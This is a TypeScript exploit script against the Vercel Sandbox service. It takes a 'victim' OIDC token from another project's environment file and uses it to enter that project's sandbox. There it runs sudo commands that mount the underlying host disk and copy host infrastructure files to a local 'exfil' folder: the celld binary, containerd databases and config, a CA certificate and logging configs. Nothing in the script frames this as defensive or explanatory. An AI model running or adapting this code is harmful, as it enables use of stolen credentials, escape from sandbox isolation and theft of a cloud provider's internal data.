import { Sandbox } from "@vercel/sandbox";
import { writeFileSync, readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });

  const prep = await sbx.runCommand("bash", ["-c", `
    set +e
    sudo mkdir -p /mnt/vda2
    sudo unshare -m --propagation private bash -c 'mount -t xfs /dev/vda /mnt/vda2 2>/dev/null; mkdir -p /tmp/exfil; cp /mnt/vda2/opt/vercel/celld /tmp/exfil/celld; cp /mnt/vda2/var/lib/containerd/io.containerd.metadata.v1.bolt/meta.db /tmp/exfil/containerd-meta.db 2>/dev/null; cp /mnt/vda2/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/metadata.db /tmp/exfil/snap-meta.db 2>/dev/null; cp /mnt/vda2/etc/containerd/config.toml /tmp/exfil/containerd-config.toml 2>/dev/null; cp /mnt/vda2/opt/vercel/*.sh /tmp/exfil/ 2>/dev/null; cp /mnt/vda2/run/cell/ca-cert.pem /tmp/exfil/ 2>/dev/null; cp /mnt/vda2/etc/vector/sinks/*.toml /tmp/exfil/ 2>/dev/null; cp /mnt/vda2/etc/vector/sources/*.toml /tmp/exfil/ 2>/dev/null; ls -la /tmp/exfil/'`], { sudo: true, wait: true, timeout: 120_000 });
  console.log("prep exit:", prep.exitCode);
  console.log((await prep.output("both")).slice(0, 2000));

  const files = ["celld", "containerd-meta.db", "snap-meta.db", "containerd-config.toml", "celld-init.sh", "celld-exit-hook.sh", "apply-variables-vector.sh", "ca-cert.pem", "datadog_celld.toml", "datadog_kernel.toml", "celld.toml", "kernel.toml"];
  for (const f of files) {
    const buf = await sbx.readFileToBuffer({ path: `/tmp/exfil/${f}` });
    if (!buf) { console.log(`${f}: null`); continue; }
    writeFileSync(`/tmp/opencode/vercel/exfil-${f}`, buf);
    console.log(`${f}: ${buf.length} bytes saved`);
  }
  console.log("done");
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });